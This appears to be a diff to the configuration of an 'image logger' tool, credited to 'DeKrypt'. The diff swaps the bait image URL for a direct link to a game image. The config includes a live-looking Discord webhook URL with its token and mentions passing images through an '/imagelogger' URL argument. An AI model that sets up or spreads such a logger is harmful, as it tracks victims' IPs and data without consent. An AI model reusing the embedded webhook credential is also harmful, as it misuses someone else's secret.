@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1445009686897233960/oGaoD1MG8pTHUGMgUA01APYNR_Cv2VNO2fXk-o4ecFOcK5EUaLyvm6vuzdXvSFSBrIk4",
-    "image": "https://gamecover.fr/valorant-beta-test-et-sortie-sur-consoles/", # You can also have a custom image by using a URL argument
+    "image": "https://gamecover.fr/wp-content/uploads/image-1415.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image 
 
